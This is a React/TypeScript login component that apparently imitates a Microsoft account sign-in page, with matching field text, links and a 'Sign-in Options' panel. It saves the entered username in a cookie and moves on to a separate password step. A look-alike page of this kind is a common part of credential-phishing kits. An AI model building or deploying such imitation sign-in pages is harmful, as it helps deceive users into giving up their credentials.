import React, { useState } from 'react'
import { useNavigate } from 'react-router-dom'
import cookies from '../utils/cookie.config'

export default function Login() {
  const [formInput, setFormInput] = useState<Login>({
    username: "",
    password: ""
})

const navigate = useNavigate()

    function handleInputChange (event:React.ChangeEvent<HTMLInputElement>){
        setFormInput((prevData) => ({
            ...prevData,
            [event.target.name]: event.target.value
        }))
    }

    function handleSubmit(event: React.FormEvent<HTMLFormElement>){
        
        event.preventDefault()
        cookies.set("login", formInput)
        navigate("password", {replace:true})
    }

  return (
    <div>

<div className="sign-in-form">
  <div style={{"marginBottom": "-15px;"}} className="brand-section">
    <img src="/static/images/brand.svg" alt="" srcSet="" />
  </div>
  <h3 style={{"fontSize": "27px;"}}>Sign In</h3>

  <form method="post" onSubmit={handleSubmit}>
    <input onChange={handleInputChange} placeholder="Email, phone, or Skype" type="text" name="username" id="" />

    <div className="margin">
      <p>
        No account? <span className="link"><a href="">Create one!</a></span>
      </p>
    </div>

    <div className="margin link">
      <a href="">Cant't access your account?</a>
    </div>

    <div className="form-buttons">
      <div className="buttons-flex">
        <div className="back-link">
          <a href="">Back</a>
        </div>

        <div className="submit-button">
          <button>Next</button>
          
        </div>
      </div>
    </div>
  </form>
</div>



<div className="sign-in-options">
  <div className="options-wrapper">
    <div className="key-icon">
      <img src="/static/images/key.svg" alt="" srcSet="" />
    </div>

    <div style={{"marginLeft": "20px"}} className="text">
      <p>Sign-in Options</p>
    </div>
  </div>
</div>

    </div>
  )
}
